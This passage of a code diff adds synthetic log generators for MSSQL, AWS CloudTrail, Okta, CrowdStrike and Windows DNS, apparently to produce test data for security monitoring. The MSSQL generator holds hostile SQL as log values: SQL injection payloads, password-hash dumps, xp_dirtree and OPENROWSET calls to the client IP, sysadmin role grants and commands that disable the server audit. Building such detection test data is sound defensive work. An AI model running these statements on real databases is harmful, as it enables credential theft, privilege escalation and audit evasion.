+      `SELECT * FROM OPENROWSET('SQLOLEDB','server=${clientIp};uid=sa;pwd=Password1','SELECT name,password_hash FROM master.sys.sql_logins')`,
+      `INSERT INTO ##exfil SELECT * FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_BLOB) AS x`,
+    ]);
+  } else if(r<0.58){
+    objName='sys.sql_logins';
+    stmt=pick([
+      `EXECUTE AS LOGIN = 'sa'`,
+      `EXEC sp_addsrvrolemember '${user}', 'sysadmin'`,
+      `ALTER SERVER ROLE sysadmin ADD MEMBER [${user}]`,
+      `SELECT name,password_hash FROM master.sys.sql_logins`,
+    ]);
+  } else if(r<0.68){
+    action='SL'; actionLabel='SELECT'; objName='dbo.Users';
+    stmt=pick([
+      `SELECT * FROM dbo.Users WHERE Username='' OR '1'='1'--`,
+      `SELECT * FROM dbo.Orders WHERE OrderID=1; WAITFOR DELAY '0:0:5'--`,
+      `SELECT * FROM dbo.Customers WHERE ID=1 UNION SELECT name,password_hash,NULL,NULL FROM master.sys.sql_logins--`,
+    ]);
+    succeeded=Math.random()>0.4;
+  } else if(r<0.78){
+    objName='master.sys.xp_dirtree';
+    stmt=pick([
+      `EXEC master.sys.xp_dirtree 'C:\\',1,1`,
+      `EXEC master.sys.xp_dirtree '\\\\${clientIp}\\share',1,1`,
+      `SELECT name,password_hash FROM master.sys.sql_logins`,
+      `SELECT * FROM master.sys.server_principals WHERE type='S'`,
+    ]);
+  } else if(r<0.87){
+    action='IN'; actionLabel='INSERT'; objName='master.sys.servers';
+    stmt=pick([
+      `EXEC sp_addlinkedserver @server='PIVOT', @srvproduct='', @provider='SQLOLEDB', @datasrc='${clientIp},1433'`,
+      `EXEC sp_addlinkedsrvlogin @rmtsrvname='PIVOT', @useself='FALSE', @rmtuser='sa', @rmtpassword='Password1'`,
+      `SELECT * FROM PIVOT.master.dbo.sysdatabases`,
+    ]);
+  } else {
+    action='AU'; actionLabel='ALTER SERVER AUDIT'; objName='SecurityAudit';
+    stmt=pick([
+      `ALTER SERVER AUDIT [SecurityAudit] DISABLE`,
+      `DROP SERVER AUDIT [SecurityAudit]`,
+      `EXEC sp_configure 'common criteria compliance enabled', 0; RECONFIGURE`,
+    ]);
+  }
+  return JSON.stringify({event_time:ts.toISOString(),action_id:action,action_name:actionLabel,succeeded,session_id:sid,server_principal_name:user,database_name:db,schema_name:'dbo',object_name:objName,statement:stmt,client_ip:clientIp});
+}
+
 function generateMSSQLLogs(count,tr,types=MSSQL_TYPES_DEFAULT){
   const active=types.length?types:MSSQL_TYPES_DEFAULT;
-  const W={audit:20,errorlog:25,translog:30,agent:15,metrics:10};
+  const W={audit:18,errorlog:20,translog:25,agent:12,metrics:10,security:15};
   const filtered=Object.entries(W).filter(([t])=>active.includes(t));
   const total=filtered.reduce((s,[,w])=>s+w,0);
   return generateTimestamps(count,tr).map(ts=>{
     let r=Math.random()*total,cum=0;
-    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genMSSQLAudit(ts):t==='errorlog'?genMSSQLErrorLog(ts):t==='translog'?genMSSQLTransactionLog(ts):t==='agent'?genMSSQLAgent(ts):genMSSQLMetrics(ts);}
+    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genMSSQLAudit(ts):t==='errorlog'?genMSSQLErrorLog(ts):t==='translog'?genMSSQLTransactionLog(ts):t==='agent'?genMSSQLAgent(ts):t==='security'?genMSSQLSecurity(ts):genMSSQLMetrics(ts);}
     return genMSSQLMetrics(ts);
   });
+}
+
+// ─── AWS CloudTrail Generator ─────────────────────────────────────────────────
+function genCTManagement(ts){
+  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
+  const isErr=Math.random()<0.08;
+  let eventName,eventSource,reqParams={};
+  if(r<0.08){eventName='ConsoleLogin';eventSource='signin.amazonaws.com';}
+  else if(r<0.16){eventName='RunInstances';eventSource='ec2.amazonaws.com';}
+  else if(r<0.24){eventName='StopInstances';eventSource='ec2.amazonaws.com';reqParams={instanceIds:[`i-${randomHex(17)}`]};}
+  else if(r<0.32){eventName='DescribeInstances';eventSource='ec2.amazonaws.com';}
+  else if(r<0.40){eventName='AuthorizeSecurityGroupIngress';eventSource='ec2.amazonaws.com';reqParams={groupId:`sg-${randomHex(8)}`,ipPermissions:[{ipProtocol:'tcp',fromPort:rand(1,65535),toPort:rand(1,65535),ipRanges:[{cidrIp:'0.0.0.0/0'}]}]};}
+  else if(r<0.48){eventName='InvokeFunction';eventSource='lambda.amazonaws.com';reqParams={functionName:`fn-${randomUser()}`};}
+  else if(r<0.56){eventName='GetSecretValue';eventSource='secretsmanager.amazonaws.com';reqParams={secretId:`/prod/${pick(['db-password','api-key','jwt-secret'])}`};}
+  else if(r<0.64){eventName='CreateSnapshot';eventSource='ec2.amazonaws.com';}
+  else if(r<0.72){eventName='DescribeDBInstances';eventSource='rds.amazonaws.com';}
+  else if(r<0.80){eventName='CreateStack';eventSource='cloudformation.amazonaws.com';}
+  else if(r<0.88){eventName='ListFunctions20150331';eventSource='lambda.amazonaws.com';}
+  else{eventName='DescribeSecurityGroups';eventSource='ec2.amazonaws.com';}
+  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource,eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0 Python/3.11.0','Mozilla/5.0 (Macintosh) AppleWebKit/537.36','Boto3/1.28.0 Python/3.11.0','console.amazonaws.com']),requestParameters:reqParams,responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account,...(isErr?{errorCode:pick(['AccessDenied','InvalidParameterValue','ThrottlingException']),errorMessage:'Access denied for this operation'}:{})});
+}
+function genCTIAM(ts){
+  const r=Math.random(),account=pick(CT_ACCOUNTS),user=randomUser(),target=randomUser();
+  let eventName,extra={};
+  if(r<0.12){eventName='CreateUser';extra={requestParameters:{userName:target}};}
+  else if(r<0.22){eventName='DeleteUser';extra={requestParameters:{userName:target}};}
+  else if(r<0.32){eventName='AttachRolePolicy';extra={requestParameters:{roleName:`svc-${target}`,policyArn:`arn:aws:iam::aws:policy/${pick(['AdministratorAccess','PowerUserAccess','ReadOnlyAccess','SecurityAudit'])}`}};}
+  else if(r<0.42){eventName='CreateAccessKey';extra={requestParameters:{userName:target}};}
+  else if(r<0.52){eventName='AssumeRole';extra={requestParameters:{roleArn:`arn:aws:iam::${pick(CT_ACCOUNTS)}:role/${pick(['OrganizationAccountAccessRole','DevOpsRole','SecurityAuditRole','CrossAccountAdmin'])}`}};}
+  else if(r<0.62){eventName='DeactivateMFADevice';extra={requestParameters:{userName:target,serialNumber:`arn:aws:iam::${account}:mfa/${target}`}};}
+  else if(r<0.72){eventName='CreateRole';extra={requestParameters:{roleName:`role-${randomHex(6)}`}};}
+  else if(r<0.82){eventName='AddUserToGroup';extra={requestParameters:{groupName:pick(['Admins','Developers','SecurityTeam','ReadOnly']),userName:target}};}
+  else if(r<0.90){eventName='UpdateAccountPasswordPolicy';}
+  else{eventName='PutRolePolicy';extra={requestParameters:{roleName:`svc-${target}`,policyName:'InlinePolicy'}};}
+  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource:'iam.amazonaws.com',eventName,awsRegion:'us-east-1',sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0','Boto3/1.28.0','console.amazonaws.com']),...extra,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account});
+}
+function genCTS3(ts){
+  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
+  const bucket=`${pick(['logs','data','backups','uploads','exports','corp'])}-${randomHex(8)}`;
+  const key=`${pick(['financial','hr','config','exports','confidential'])}/${rand(2024,2025)}/${randomHex(8)}.${pick(['csv','json','zip','pdf','xlsx'])}`;
+  let eventName;
+  if(r<0.30)eventName='GetObject';
+  else if(r<0.50)eventName='PutObject';
+  else if(r<0.62)eventName='ListBuckets';
+  else if(r<0.72)eventName='CreateBucket';
+  else if(r<0.82)eventName='DeleteObject';
+  else if(r<0.90)eventName='GetBucketAcl';
+  else eventName='PutBucketPolicy';
+  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:pick(['IAMUser','AssumedRole']),principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource:'s3.amazonaws.com',eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0','Boto3/1.28.0','S3 Console']),requestParameters:{bucketName:bucket,...(eventName!=='ListBuckets'&&eventName!=='CreateBucket'?{key}:{})},responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account,resources:[{ARN:`arn:aws:s3:::${bucket}/${key}`,accountId:account,type:'AWS::S3::Object'}]});
+}
+function genCTSecurity(ts){
+  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
+  const isRoot=r<0.06;
+  let eventName,eventSource;
+  if(r<0.15){eventName='DeleteTrail';eventSource='cloudtrail.amazonaws.com';}
+  else if(r<0.28){eventName='StopLogging';eventSource='cloudtrail.amazonaws.com';}
+  else if(r<0.40){eventName='PutEventSelectors';eventSource='cloudtrail.amazonaws.com';}
+  else if(r<0.52){eventName='DisableKey';eventSource='kms.amazonaws.com';}
+  else if(r<0.64){eventName='ScheduleKeyDeletion';eventSource='kms.amazonaws.com';}
+  else if(r<0.76){eventName='GetPasswordData';eventSource='ec2.amazonaws.com';}
+  else if(r<0.88){eventName='GetSecretValue';eventSource='secretsmanager.amazonaws.com';}
+  else{eventName='CreateVpcPeeringConnection';eventSource='ec2.amazonaws.com';}
+  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:isRoot?'Root':'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:${isRoot?'root':('user/'+user)}`,accountId:account,...(isRoot?{}:{userName:user})},eventTime:ts.toISOString(),eventSource,eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:'aws-cli/2.13.0',requestParameters:{},responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account});
+}
+function generateCloudTrailLogs(count,tr,types=CT_TYPES_DEFAULT){
+  const gens=[];
+  if(types.includes('management'))gens.push(genCTManagement,genCTManagement);
+  if(types.includes('iam'))gens.push(genCTIAM);
+  if(types.includes('s3_data'))gens.push(genCTS3,genCTS3);
+  if(types.includes('security'))gens.push(genCTSecurity);
+  if(gens.length===0)gens.push(genCTManagement);
+  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
+}
+
+// ─── Okta Generator ───────────────────────────────────────────────────────────
+function genOktaAuth(ts){
+  const r=Math.random(),isFailure=r>0.75,user=randomEmail();
+  let eventType,severity,reason=null;
+  if(isFailure){
+    eventType=pick(['user.session.start','user.authentication.auth_via_mfa','user.authentication.sso']);
+    severity='WARN';reason=pick(['INVALID_CREDENTIALS','MFA_ENROLL_NOT_ALLOWED','FACTOR_TIMEOUT','USER_LOCKED','NETWORK_ZONE_BLACKLIST']);
+  }else{
+    eventType=r<0.3?'user.session.start':r<0.5?'user.authentication.sso':r<0.65?'user.authentication.auth_via_mfa':r<0.75?'user.session.end':'user.authentication.auth_via_radius';
+    severity='INFO';
+  }
+  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:user,displayName:user.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:pick(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15','okta-auth-js/7.0.0'])},geographicalContext:{city:pick(['New York','London','San Francisco','Chicago','Berlin']),country:pick(['United States','United Kingdom','Germany']),state:pick(['NY','CA','IL','TX'])}},authenticationContext:{authenticationStep:0,externalSessionId:`idx${randomHex(20)}`,...(isFailure?{}:{credentialProvider:pick(['OKTA_CREDENTIAL_PROVIDER','IDP']),credentialType:pick(['password','PASSWORD_WITH_MFA'])})},displayMessage:isFailure?'User login to Okta failed':'User login to Okta',eventType,outcome:{result:isFailure?'FAILURE':'SUCCESS',...(reason?{reason}:{})},published:ts.toISOString(),securityContext:{asNumber:rand(10000,65000),asOrg:pick(['AS-ACME','TELENET','AS-CORP']),domain:randomDomain(),isProxy:Math.random()<0.05,isp:pick(['Comcast','AT&T','BT','Deutsche Telekom'])},severity,target:[{id:`00u${randomHex(17)}`,type:'User',alternateId:user,displayName:user.split('@')[0]}],transaction:{type:'WEB',id:randomHex(36)},uuid:randomHex(36),version:'0'});
+}
+function genOktaLifecycle(ts){
+  const r=Math.random(),actor=randomEmail(),target=randomEmail();
+  let eventType,severity='INFO';
+  if(r<0.15){eventType='user.lifecycle.create';}
+  else if(r<0.25){eventType='user.lifecycle.deactivate';severity='WARN';}
+  else if(r<0.35){eventType='user.lifecycle.suspend';severity='WARN';}
+  else if(r<0.45){eventType='user.account.update_password';}
+  else if(r<0.55){eventType='user.mfa.factor.activate';}
+  else if(r<0.65){eventType='user.mfa.factor.deactivate';severity='WARN';}
+  else if(r<0.78){eventType='group.user_membership.add';}
+  else if(r<0.88){eventType='group.user_membership.remove';}
+  else{eventType='user.lifecycle.unsuspend';}
+  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'},geographicalContext:{country:'United States',city:'New York'}},displayMessage:eventType.replace(/\./g,' ').replace(/_/g,' '),eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity,target:[{id:`00u${randomHex(17)}`,type:'User',alternateId:target,displayName:target.split('@')[0]},...(eventType.includes('group')?[{id:`00g${randomHex(17)}`,type:'UserGroup',alternateId:pick(['Admins','Developers','SecurityTeam','ReadOnly']),displayName:pick(['Admins','Developers','SecurityTeam','ReadOnly'])}]:[])],uuid:randomHex(36),version:'0'});
+}
+function genOktaPolicy(ts){
+  const r=Math.random(),actor=randomEmail();
+  let eventType,severity='INFO';
+  if(r<0.20){eventType='policy.lifecycle.create';}
+  else if(r<0.40){eventType='policy.lifecycle.update';}
+  else if(r<0.50){eventType='policy.lifecycle.delete';severity='WARN';}
+  else if(r<0.65){eventType='policy.rule.add';}
+  else if(r<0.80){eventType='policy.rule.update';}
+  else{eventType='policy.rule.delete';severity='WARN';}
+  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'}},displayMessage:eventType.replace(/\./g,' ').replace(/_/g,' '),eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity,target:[{id:`00p${randomHex(17)}`,type:'Policy',alternateId:pick(['Default Policy','MFA Enrollment','Sign-On Policy','Password Policy','Device Trust']),displayName:pick(['Default Policy','MFA Enrollment','Sign-On Policy','Password Policy','Device Trust'])}],uuid:randomHex(36),version:'0'});
+}
+function genOktaApp(ts){
+  const actor=randomEmail(),app=pick(OKTA_APPS);
+  const r=Math.random();
+  let eventType;
+  if(r<0.2)eventType='application.lifecycle.create';
+  else if(r<0.35)eventType='application.lifecycle.update';
+  else if(r<0.45)eventType='application.lifecycle.deactivate';
+  else if(r<0.62)eventType='user.authentication.sso';
+  else if(r<0.78)eventType='application.provision.create_user';
+  else eventType='application.provision.deactivate_user';
+  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'}},displayMessage:`${eventType.replace(/\./g,' ')} for ${app}`,eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity:'INFO',target:[{id:`0oa${randomHex(17)}`,type:'AppInstance',alternateId:app,displayName:app}],uuid:randomHex(36),version:'0'});
+}
+function generateOktaLogs(count,tr,types=OKTA_TYPES_DEFAULT){
+  const gens=[];
+  if(types.includes('auth'))gens.push(genOktaAuth,genOktaAuth,genOktaAuth);
+  if(types.includes('lifecycle'))gens.push(genOktaLifecycle);
+  if(types.includes('policy'))gens.push(genOktaPolicy);
+  if(types.includes('app'))gens.push(genOktaApp);
+  if(gens.length===0)gens.push(genOktaAuth);
+  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
+}
+
+// ─── CrowdStrike Generator ────────────────────────────────────────────────────
+function genCSProcess(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  const isSusp=Math.random()<0.25;
+  const proc=isSusp?pick(['powershell.exe','cmd.exe','certutil.exe','mshta.exe','wscript.exe','rundll32.exe']):pick(['chrome.exe','outlook.exe','svchost.exe','explorer.exe','teams.exe']);
+  return JSON.stringify({metadata:{eventType:'ProcessRollup2',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'ProcessRollup2',FileName:proc,FilePath:isSusp?'C:\\Windows\\Temp\\':`C:\\Program Files\\${proc.replace('.exe','')}\\`,CommandLine:isSusp?pick(SUSPICIOUS_CMDS):`"C:\\Program Files\\${proc}" --type=renderer`,UserName:`${domain}\\${user}`,SHA256HashData:randomHex(64),MD5HashData:randomHex(32),ProcessStartTime:ts.getTime()/1000,ProcessEndTime:0,ProcessId:rand(100,65535),ParentProcessId:rand(100,65535),ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC()}});
+}
+function genCSNetwork(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  return JSON.stringify({metadata:{eventType:'NetworkConnectIP4',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'NetworkConnectIP4',LocalAddressIP4:hi.ip,RemoteAddressIP4:Math.random()<0.3?randomIP():randomPrivateIP(),LocalPort:randomHighPort(),RemotePort:randomPort(),Protocol:pick([6,17]),ConnectionDirection:pick([0,1]),FileName:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe','curl.exe']),UserName:`${domain}\\${user}`,ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,MACAddress:randomMAC()}});
+}
+function genCSDetection(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  const severity=pick([2,3,4,5]);
+  const sevName={2:'Low',3:'Medium',4:'High',5:'Critical'}[severity];
+  const tactic=pick(CS_TACTICS),technique=pick(CS_TECHNIQUES);
+  return JSON.stringify({metadata:{eventType:'DetectionSummaryEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'DetectionSummaryEvent',DetectId:`ldt:${randomHex(32)}:${rand(100000000,999999999)}`,DetectDescription:pick(CS_DETECT_NAMES),Severity:severity,SeverityName:sevName,OriginalFilename:pick(['powershell.exe','mimikatz.exe','PsExec.exe','meterpreter.exe','cobalt.exe']),FileName:pick(['powershell.exe','svchost32.exe','update.exe','temp.exe']),FilePath:'\\Device\\HarddiskVolume3\\Windows\\Temp\\',CommandLine:pick(SUSPICIOUS_CMDS),UserName:`${domain}\\${user}`,ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,ProcessId:rand(1000,65535),ParentProcessId:rand(1000,65535),ParentCommandLine:pick(['cmd.exe /c','explorer.exe','services.exe']),Tactic:tactic,Technique:technique,Objective:'Falcon Detection Method',SHA256HashData:randomHex(64),MD5HashData:randomHex(32),LocalIP:hi.ip,MACAddress:randomMAC(),PatternDispositionDescription:pick(['Prevention,Kill Process','Detection,Allow','Detection,Quarantine'])}});
+}
+function genCSDNS(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  const isSusp=Math.random()<0.12;
+  const qname=isSusp?`${randomHex(12)}.${pick(['update-srv.net','cdn-edge.io','api-gateway.xyz','telemetry-hub.com'])}`:pick([randomDomain(),`wpad.${randomDomain()}`,`dc.${adDomain()}`,`_kerberos._tcp.${adDomain()}`]);
+  return JSON.stringify({metadata:{eventType:'DnsRequest',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'DnsRequest',DomainName:qname,RequestType:pick([1,28,5]),InterfaceIndex:rand(1,10),ComputerName:host,UserName:`${domain}\\${user}`,FileName:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe']),OperatingSystem:hi.os.name,LocalIP:hi.ip}});
+}
+function genCSVulnerability(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host];
+  const cvss=parseFloat((Math.random()*10).toFixed(1));
+  const sev=cvss>=9?'CRITICAL':cvss>=7?'HIGH':cvss>=4?'MEDIUM':'LOW';
+  const cveId=`CVE-${rand(2020,2024)}-${rand(1000,49999)}`;
+  const prod=pick([{name:'Microsoft Windows',ver:'10.0.19041'},{name:'OpenSSL',ver:'1.1.1t'},{name:'Apache Log4j',ver:'2.14.1'},{name:'VMware vSphere',ver:'7.0.0'},{name:'Google Chrome',ver:'114.0.5735.90'},{name:'Adobe Acrobat',ver:'22.001.20169'},{name:'Microsoft Office',ver:'16.0.14326'},{name:'Oracle Java',ver:'17.0.1'},{name:'Apache HTTP Server',ver:'2.4.51'}]);
+  const status=pick(['open','in_progress','closed_resolved','reactivated']);
+  const remediations=pick(['Apply latest security patches','Update to latest version','Disable vulnerable feature','Apply vendor workaround','Isolate affected systems']);
+  return JSON.stringify({metadata:{eventType:'SpotlightVulnerabilityEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,version:'1.0',aid:hi.aid},event:{EventType:'SpotlightVulnerabilityEvent',id:`vuln:${randomHex(32)}`,aid:hi.aid,cve:{id:cveId,severity:sev,base_score:cvss,exploit_status:pick([0,1,2]),description:`Vulnerability in ${prod.name} allowing ${pick(['remote code execution','privilege escalation','information disclosure','denial of service','authentication bypass'])}`,published_date:new Date(Date.now()-rand(30,730)*86400000).toISOString()},status,host_info:{hostname:host,local_ip:hi.ip,os_version:hi.os.name,os_version_normalized:hi.os.version},app:{product_name_version:`${prod.name} ${prod.ver}`,sub_status:'active'},remediation_description:remediations,ComputerName:host,MachineDomain:randomDomain().split('.')[0].toUpperCase(),OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC()}});
+}
+function genCSAlert(ts){
+  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  const severity=pick([2,3,4,5]);
+  const sevName={2:'Low',3:'Medium',4:'High',5:'Critical'}[severity];
+  const tactic=pick(CS_TACTICS),technique=pick(CS_TECHNIQUES);
+  const alertType=pick(['FusionAlertSignalMalwareAlert','FusionAlertSignalBehaviorAlert','FusionAlertSignalIdentityAlert','FusionAlertSignalCompositeAlert','FusionAlertSignalNetworkAlert']);
+  return JSON.stringify({metadata:{eventType:'AlertSummaryEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'AlertSummaryEvent',AlertId:`ldt:${randomHex(32)}:${rand(100000000,999999999)}`,AlertType:alertType,Name:pick(CS_DETECT_NAMES),Description:`${tactic} activity detected: ${technique} technique observed on endpoint`,Severity:severity,SeverityName:sevName,Tactic:tactic,Technique:technique,Status:pick(['new','in_progress','closed_false_positive','closed_true_positive']),AssignedToName:'',CreatedTimestamp:ts.getTime()/1000,UpdatedTimestamp:ts.getTime()/1000,ComputerName:host,UserName:`${domain}\\${user}`,MachineDomain:domain,OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC(),SHA256HashData:randomHex(64),FileName:pick(['powershell.exe','svchost32.exe','update.exe','temp.exe','mimikatz.exe']),CommandLine:pick(SUSPICIOUS_CMDS),PatternDispositionDescription:pick(['Prevention,Kill Process','Detection,Allow','Detection,Quarantine'])}});
+}
+function genCSHost(ts,hostName){
+  const host=hostName||pick(CS_HOSTS);
+  const hi=CS_HOST_INFO[host];
+  const domain=randomDomain().split('.')[0].toUpperCase();
+  const productType=(/^(DC|ADDC|PDC)/.test(host)?'Domain Controller':/^SRV/.test(host)?'Server':'Workstation');
+  const manufacturers=['Dell Inc.','HP Inc.','Lenovo','VMware, Inc.','Microsoft Corporation'];
+  const models={Workstation:['OptiPlex 7090','EliteDesk 800','ThinkCentre M90'],Server:['PowerEdge R750','ProLiant DL380','ThinkSystem SR650'],Laptop:['Latitude 5520','EliteBook 840','ThinkPad X1 Carbon'],'Domain Controller':['PowerEdge R640','ProLiant DL360','VMware Virtual Platform']};
+  const typeKey=productType==='Server'||productType==='Domain Controller'?productType:/^LAPTOP/.test(host)?'Laptop':'Workstation';
+  return JSON.stringify({
+    device_id:hi.aid,
+    hostname:host,
+    local_ip:hi.ip,
+    external_ip:randomIP(),
+    mac_address:randomMAC(),
+    os_version:hi.os.name,
+    os_version_normalized:hi.os.version,
+    platform_name:'Windows',
+    platform_id:'0',
+    agent_version:hi.sensorVersion,
+    agent_local_time:ts.toISOString(),
+    first_seen:new Date(ts.getTime()-rand(30,365)*86400000).toISOString(),
+    last_seen:ts.toISOString(),
+    status:'normal',
+    containment_status:'normal',
+    product_type_desc:productType,
+    system_manufacturer:pick(manufacturers),
+    system_product_name:pick(models[typeKey]||models['Workstation']),
+    machine_domain:domain,
+    ou:'OU=Computers,DC='+domain+',DC=local',
+    site_name:'Default-First-Site-Name',
+    tags:['SensorGroupingTags/production','FalconGroupingTags/'+productType.toLowerCase().replace(' ','-')],
+    groups:[{id:randomHex(32),name:'Default'}],
+    policies:[{policy_type:'prevention',policy_id:randomHex(32),applied:true,settings_hash:randomHex(8),assigned_date:new Date(ts.getTime()-rand(1,180)*86400000).toISOString(),applied_date:new Date(ts.getTime()-rand(1,180)*86400000).toISOString()}],
+    _eventType:'HostInventory',
+  });
+}
+function generateCrowdStrikeLogs(count,tr,types=CS_TYPES_DEFAULT){
+  const logs=[];
+  const tsList=generateTimestamps(count,tr);
+  const gens=[];
+  if(types.includes('process'))gens.push(genCSProcess,genCSProcess);
+  if(types.includes('network'))gens.push(genCSNetwork,genCSNetwork);
+  if(types.includes('detections'))gens.push(genCSDetection);
+  if(types.includes('dns'))gens.push(genCSDNS);
+  if(types.includes('vulnerability'))gens.push(genCSVulnerability);
+  if(types.includes('alerts'))gens.push(genCSAlert);
+  if(types.includes('host')){const now=new Date();CS_HOSTS.forEach(h=>logs.push(genCSHost(now,h)));}
+  if(gens.length>0)tsList.forEach(ts=>logs.push(pick(gens)(ts)));
+  else if(logs.length===0)tsList.forEach(ts=>logs.push(genCSProcess(ts)));
+  return logs;
+}
+
+// ─── Windows DNS & AD Generator ───────────────────────────────────────────────
+function genWDNSQuery(ts){
+  const host=randomHostname(),domain=adDomain();
+  const isSusp=Math.random()<0.08;
+  const qname=isSusp?`${randomHex(14)}.${pick(['tunneling.io','dns-exfil.net','c2-domain.xyz','update-srv.net'])}`:pick([randomDomain(),`wpad.${domain}`,`dc.${domain}`,`_kerberos._tcp.${domain}`,`ldap.${domain}`,`gc._msdcs.${domain}`]);
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:22,channel:'Microsoft-Windows-Sysmon/Operational',computer_name:`${host}.${domain}`,provider_name:'Microsoft-Windows-Sysmon',record_id:rand(10000,9999999),event_data:{RuleName:'-',UtcTime:ts.toISOString().replace('T',' ').replace('Z',''),ProcessGuid:`{${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}}`,ProcessId:rand(100,65535),QueryName:qname,QueryStatus:'0',QueryResults:randomIP(),Image:`C:\\${pick(['Windows\\System32\\svchost.exe','Program Files\\Google\\Chrome\\Application\\chrome.exe','Windows\\System32\\powershell.exe','Windows\\explorer.exe'])}`}},event:{code:'22',action:'dns-query',category:['network'],outcome:'success',kind:'event'},dns:{question:{name:qname,type:pick(['A','AAAA','CNAME','MX','TXT'])},answers:[{data:randomIP()}]},host:{name:host,hostname:host}});
+}
+function genWDNSKerberos(ts){
+  const dc=`${pick(AD_DC_HOSTS)}.${adDomain()}`,user=randomUser(),domain=adDomain().split('.')[0].toUpperCase();
+  const eid=pick([4768,4768,4769,4769,4771,4776]);
+  let evtData,action,outcome;
+  if(eid===4768){evtData={TargetUserName:user,TargetDomainName:domain,ServiceName:'krbtgt',TicketEncryptionType:pick(['0x12','0x17','0x11']),TicketOptions:'0x40810010',Status:'0x0',IpAddress:randomIP()};action='kerberos-tgt-request';outcome='success';}
